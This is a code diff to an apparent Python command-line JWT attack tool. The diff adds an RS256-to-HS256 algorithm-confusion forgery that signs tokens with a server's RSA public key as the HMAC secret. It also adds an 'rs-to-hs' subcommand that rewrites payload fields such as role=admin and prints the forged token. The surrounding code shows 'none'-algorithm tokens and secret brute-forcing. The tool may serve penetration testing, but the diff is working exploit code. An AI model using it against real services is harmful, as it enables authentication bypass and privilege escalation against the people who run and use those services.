@@ -35,7 +35,8 @@ def encode_token(header: dict, payload: dict, signature: bytes) -> str:
     return f"{header_part}.{payload_part}.{signature_part}"
 
 
-def sign_hs256(header: dict, payload: dict, secret: str) -> str:
+def _sign_hs256_raw(header: dict, payload: dict, secret_bytes: bytes) -> str:
+    """Core HS256 signing logic accepting raw bytes as secret."""
     signed_header = dict(header)
     signed_header["alg"] = "HS256"
     signing_input = (
@@ -43,8 +44,12 @@ def sign_hs256(header: dict, payload: dict, secret: str) -> str:
         + "."
         + b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8"))
     )
-    signature = hmac.new(secret.encode("utf-8"), signing_input.encode("ascii"), hashlib.sha256).digest()
+    signature = hmac.new(secret_bytes, signing_input.encode("ascii"), hashlib.sha256).digest()
     return f"{signing_input}.{b64url_encode(signature)}"
+
+
+def sign_hs256(header: dict, payload: dict, secret: str) -> str:
+    return _sign_hs256_raw(header, payload, secret.encode("utf-8"))
 
 
 def verify_hs256(token: str, secret: str) -> bool:
@@ -64,6 +69,17 @@ def make_none_token(header: dict, payload: dict) -> str:
     none_header = dict(header)
     none_header["alg"] = "none"
     return encode_token(none_header, payload, b"")
+
+
+def resign_rs_to_hs(header: dict, payload: dict, pubkey_path: str) -> str:
+    """Sign a token as HS256 using an RSA public key file as the HMAC secret.
+
+    Classic RS256->HS256 algorithm confusion: the server verifies
+    using its RSA public key, so if it also accepts HS256 it will
+    treat the same key material as the HMAC shared secret.
+    """
+    key_bytes = Path(pubkey_path).read_bytes()
+    return _sign_hs256_raw(header, payload, key_bytes)
 
 
 def apply_updates(payload: dict, updates: list[str]) -> dict:
@@ -94,6 +110,8 @@ def inspect_token(token: str) -> dict:
         recommended_checks.append("Server may accept unsigned tokens")
     if alg.startswith("HS"):
         recommended_checks.append("Check for weak shared secrets and re-signing opportunities")
+    if alg.startswith("RS"):
+        recommended_checks.append("If the public key is obtainable, try RS256->HS256 algorithm confusion")
     if suspicious_headers:
         recommended_checks.append("Inspect header-driven key selection fields")
     if any(key in payload for key in ("role", "admin", "scope", "is_admin")):
@@ -127,6 +145,11 @@ def parse_args() -> argparse.Namespace:
     brute_parser.add_argument("--token", required=True)
     brute_parser.add_argument("--wordlist", required=True)
 
+    rs_hs_parser = subparsers.add_parser("rs-to-hs", help="Forge HS256 token using an RSA public key (algorithm confusion)")
+    rs_hs_parser.add_argument("--token", required=True)
+    rs_hs_parser.add_argument("--set", action="append", default=[], help="Update payload fields, e.g. role=admin")
+    rs_hs_parser.add_argument("--pubkey", required=True, help="Path to the RSA public key file")
+
     return parser.parse_args()
 
 
@@ -158,6 +181,11 @@ def main() -> int:
                 return 0
         print(json.dumps({"secret": None}, ensure_ascii=False))
         return 1
+
+    if args.command == "rs-to-hs":
+        header, payload, _ = decode_token(args.token)
+        print(resign_rs_to_hs(header, apply_updates(payload, args.set), args.pubkey))
+        return 0
 
     raise ValueError(f"Unhandled command: {args.command}")
 
